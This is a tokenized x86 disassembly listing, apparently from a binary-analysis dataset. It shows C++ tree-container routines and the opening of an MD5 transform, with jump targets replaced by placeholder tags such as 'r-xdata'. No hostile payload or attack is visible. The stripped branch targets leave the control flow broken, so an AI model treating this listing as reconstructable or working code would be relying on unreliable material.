pop ecx
push 0xffffffff
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x7
call sub_40400a
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push ebx
push 0x1
mov ecx esi
jmp r-xdata
push eax
push ebx
push esi
lea esi [ ebp - 0x30 ]
call sub_40ed02
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_40400a
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
mov ecx esi
call sub_40415f
mov eax [ ebp - 0x10 ]
push 0xffffffff
inc eax
push eax
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_40ed02
push eax
xor esi esi
lea eax [ ebp - 0x30 ]
inc esi
push eax
mov [ ebp - 0x4 ] esi
call sub_418ff0
pop ecx
pop ecx
push 0xffffffff
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_40400a
push ebx
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
push ebx
push esi
jmp r-xdata
push eax
push ebx
lea ecx [ edi + 0x54 ]
push esi
call sub_40400a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_40415f
lea ecx [ ebp - 0x4c ]
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
call sub_418ff0
pop ecx
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x9
call sub_40400a
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
mov ecx edi
call sub_414585
sub_41483b
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov edi ecx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
call sub_418ff0
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_40400a
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
call sub_414884
call sub_425e4c
retn 0x4
sub_414884
push 0x1c
mov eax sub_43c2f7
call sub_425dad
push 0xffffffff
xor ebx ebx
push ebx
lea eax [ edi + 0x70 ]
lea esi [ edi + 0x8c ]
push eax
mov ecx esi
call sub_40400a
cmp [ edi + 0x14 ] ebx
je r-xdata
call sub_425e4c
retn
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_4148d3
pop ecx
pop ecx
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] ebx
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
sub_4148d3
push 0x20
mov eax sub_43af73
call sub_425dad
and [ ebp - 0x10 ] 0x0
xor edi edi
push 0x2f
inc edi
lea esi [ ebp - 0x2c ]
call sub_414542
mov esi eax
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_404233
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_41491f
push 0x20
mov eax sub_43af73
call sub_425dad
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_403de3
and [ ebp - 0x4 ] 0x0
xor ebx ebx
push 0x40
inc ebx
mov edi eax
call sub_403fc6
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
sub_414983
push 0x4
mov eax sub_43ceea
call sub_425dad
lea esi [ edi + 0x4 ]
push 0x4
mov [ edi ] r--data
mov [ ebp - 0x10 ] esi
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_41539d
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x19 ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
and [ edi + 0x24 ] 0x0
mov eax edi
call sub_425e4c
retn
sub_4149f1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x10
mov eax [ ebx + 0x1c ]
mov eax [ eax ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ esp + 0x8 ] eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
call sub_40f2d4
cmp [ eax ] 0x0
je r-xdata
lea esi [ esp + 0x8 ]
call sub_414b4a
jmp r-xdata
call sub_40f2d4
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x4 ] ecx
jg r-xdata
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x4 ]
lea edi [ esp + 0x10 ]
lea esi [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
call sub_40f543
test al al
jne r-xdata
call sub_40f2d4
mov edi [ ebp + 0xc ]
test [ eax + 0x8 ] edi
je r-xdata
call sub_40f2d4
push [ ebp + 0x10 ]
mov ecx [ eax ]
mov eax [ ecx ]
push edi
push [ ebp + 0x8 ]
call [ eax + 0x4 ]
sub_414a75
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x19 ] 0x0
push esi
push edi
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
push [ ebp - 0xc ]
xor eax eax
push [ ebp - 0x10 ]
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_414b97
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_40f2d4
pop edi
add eax 0x4
pop esi
leave
retn 0x4
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
sub_414b4a
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x19 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x19 ] bl
jne r-xdata
call sub_423d5c
jmp r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x19 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ecx ]
cmp [ eax + 0x19 ] bl
je r-xdata
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_414b97
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x1c ] eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
push [ ebp + 0xc ]
mov ecx [ ebx + 0x18 ]
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x10 ]
lea esi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov ecx [ ebp + 0x14 ]
cmp edx [ ecx + 0xc ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ebp + 0x14 ]
cmp [ eax + 0xc ] ecx
jbe r-xdata
mov eax [ ebx + 0x18 ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx + 0xc ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jae r-xdata
push [ ebp + 0xc ]
push ebx
lea ebx [ ebp - 0x14 ]
call sub_414de0
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
push eax
jmp r-xdata
jae r-xdata
mov ecx [ ebp + 0x10 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_415288
mov ecx [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0xc ] ecx
jae r-xdata
push edx
push 0x0
jmp r-xdata
push 0x1
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] eax
call sub_414b4a
lea edi [ ebp - 0x10 ]
mov esi eax
call sub_40f543
mov ecx [ ebp - 0x4 ]
test al al
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax + 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x19 ] 0x0
push edi
mov esi ebx
je r-xdata
mov esi ebx
mov eax [ ebp + 0x14 ]
mov edx [ eax + 0x8 ]
cmp [ edx + 0x19 ] 0x0
push [ ebp + 0xc ]
mov esi ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
jmp r-xdata
push 0x0
mov ecx eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41513b
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_414cf6
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
push edi
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_40f543
test al al
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0xc ]
lea esi [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_414b4a
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
push ebx
call sub_414ea1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0x18 ]
push [ eax + 0x4 ]
mov ecx ebx
call sub_4152e9
mov eax [ ebx + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x18 ]
and [ ebx + 0x1c ] 0x0
mov [ eax ] eax
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_414dac
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_414cf6
push [ esi + 0x18 ]
call sub_42412e
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
mov esp ebp
pop ebp
retn
sub_414de0
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x19 ] 0x0
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov edi [ ebp - 0x8 ]
mov eax [ esi ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
mov ecx [ edi + 0xc ]
mov eax [ ebp + 0xc ]
cmp ecx [ eax ]
jae r-xdata
mov ecx [ esi + 0x18 ]
mov ecx [ ecx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] eax
call sub_40f543
test al al
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x0
push eax
push [ ebp - 0x4 ]
jmp r-xdata
lea esi [ ebp - 0x10 ]
call sub_415288
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x1
cmp edi [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
setb [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41513b
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
pop edi
mov eax ebx
pop esi
leave
retn 0x8
sub_414ea1
push 0x4c
mov eax sub_43b016
call sub_425dad
mov ebx [ ebp + 0x14 ]
cmp [ ebx + 0x19 ] 0x0
je r-xdata
lea esi [ ebp + 0x10 ]
call sub_414b4a
mov edx [ ebx ]
cmp [ edx + 0x19 ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_401065
push r--data
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x58 ] r--data
call sub_42597b
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x8 ]
mov edi [ ecx ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x19 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x18 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x19 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x18 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x18 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x19 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
lea ecx [ ebx + 0x18 ]
add eax 0x18
cmp eax ecx
je r-xdata
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ edi + 0x19 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x11 ] dl
mov dl [ ecx ]
mov [ eax ] dl
mov al [ ebp - 0x11 ]
mov [ ecx ] al
push ebx
call sub_42412e
mov eax [ ebp + 0x8 ]
pop ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
jbe r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov [ edx ] ecx
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
call sub_425e4c
retn 0x10
dec ecx
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x18 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x18 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x1
mov ecx esi
mov [ esi + 0x18 ] 0x0
call sub_41535b
mov ecx [ esi ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x1
mov ecx esi
mov [ esi + 0x18 ] 0x0
call sub_41531b
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] 0x1
je r-xdata
mov al [ esi + 0x18 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x18 ] al
mov [ esi + 0x18 ] 0x1
mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x18 ] 0x1
call sub_41535b
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x1
mov [ ecx + 0x18 ] 0x0
call sub_41531b
mov ecx [ esi ]
mov [ ecx + 0x18 ] 0x0
mov al [ esi + 0x18 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x18 ] al
mov [ esi + 0x18 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x18 ] 0x1
call sub_41531b
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x1
mov [ ecx + 0x18 ] 0x0
call sub_41535b
mov ecx [ esi + 0x8 ]
sub_41513b
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov edi ecx
cmp [ esi + 0x1c ] 0x15555554
jb r-xdata
push [ ebp + 0x10 ]
mov eax [ esi + 0x18 ]
push eax
push edi
push eax
call sub_4153c7
inc [ esi + 0x1c ]
mov ebx eax
mov eax [ esi + 0x18 ]
cmp edi eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov eax [ esi + 0x18 ]
mov [ eax ] ebx
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ edi ] ebx
mov eax [ esi + 0x18 ]
cmp edi [ eax ]
jne r-xdata
mov [ eax + 0x8 ] ebx
mov edi ebx
lea eax [ ebx + 0x4 ]
jmp r-xdata
mov [ eax ] ebx
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x18 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ecx
call sub_425e4c
retn 0xc
mov edx [ edx ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov edx [ edx + 0x8 ]
cmp [ edx + 0x18 ] 0x0
je r-xdata
cmp edi [ ecx ]
jne r-xdata
mov [ ecx + 0x18 ] 0x1
mov [ edx + 0x18 ] 0x1
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov eax [ eax ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp edi [ ecx + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x18 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_41531b
push esi
mov edi ecx
call sub_41535b
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x18 ] 0x1
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
push esi
call sub_41535b
jmp r-xdata
push esi
mov edi ecx
call sub_41531b
sub_415288
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x19 ] bl
je r-xdata
call sub_423d5c
mov ecx [ eax ]
cmp [ ecx + 0x19 ] bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ esi + 0x4 ] eax
cmp [ eax + 0x19 ] bl
je r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax + 0x19 ] bl
je r-xdata
jmp r-xdata
mov eax esi
pop ebx
retn
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0x19 ] bl
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x19 ] bl
je r-xdata
call sub_423d5c
jmp r-xdata
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] eax
mov ecx eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
sub_4152e9
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi + 0x19 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_4152e9
mov esi [ esi ]
push edi
call sub_42412e
cmp [ esi + 0x19 ] 0x0
pop ecx
mov edi esi
je r-xdata
sub_41531b
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_41535b
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov edx [ edx + 0x18 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
retn 0x4
sub_41539d
push 0x1c
call sub_4246c6
xor edx edx
pop ecx
cmp eax edx
je r-xdata
lea ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
mov [ eax ] edx
lea ecx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov [ ecx ] edx
mov [ eax + 0x18 ] 0x1
mov [ eax + 0x19 ] dl
retn
mov [ ecx ] edx
sub_4153c7
push 0x1c
call sub_4246c6
pop ecx
test eax eax
je r-xdata
retn 0x10
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0x14 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
push edi
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0x8 ] ecx
lea edi [ eax + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ eax + 0x18 ] 0x0
mov [ eax + 0x19 ] 0x0
pop esi
sub_415424
push ebp
mov ebp esp
sub esp 0x84
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x18 ]
push ebx
mov ebx [ eax + 0x10 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
test al 0x3
je r-xdata
mov edi [ ebp - 0x8 ]
and edi ebx
mov ecx [ eax ]
mov esi ebx
not esi
and esi edx
or esi edi
add esi ecx
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ esi + ecx - 0x28955b88 ]
mov esi [ eax + 0x4 ]
rol ecx 0x7
add ecx ebx
mov [ ebp - 0x2c ] esi
mov esi ecx
mov edi ebx
and edi ecx
not esi
and esi [ ebp - 0x8 ]
or esi edi
add esi [ ebp - 0x2c ]
lea edx [ esi + edx - 0x173848aa ]
mov esi [ eax + 0x8 ]
rol edx 0xc
add edx ecx
mov edi edx
not edi
and edi ebx
mov ebx edx
and ebx ecx
or edi ebx
add edi esi
mov [ ebp - 0x38 ] esi
mov esi [ ebp - 0x8 ]
lea edi [ edi + esi + 0x242070db ]
mov esi [ eax + 0xc ]
ror edi 0xf
add edi edx
mov [ ebp - 0x24 ] esi
mov ebx edi
not ebx
and ebx ecx
mov esi edx
and esi edi
or ebx esi
add ebx [ ebp - 0x24 ]
mov esi [ ebp + 0x8 ]
mov esi [ esi + 0x10 ]
lea esi [ ebx + esi - 0x3e423112 ]
ror esi 0xa
add esi edi
mov [ ebp - 0x4 ] edi
and edi esi
mov ebx esi
not ebx
and ebx edx
or ebx edi
mov edi [ eax + 0x10 ]
add ebx edi
lea ecx [ ebx + ecx - 0xa83f051 ]
rol ecx 0x7
add ecx esi
mov [ ebp + 0xc ] ecx
not ecx
and ecx [ ebp - 0x4 ]
mov ebx esi
and ebx [ ebp + 0xc ]
mov [ ebp - 0x34 ] edi
mov edi [ eax + 0x14 ]
or ecx ebx
add ecx edi
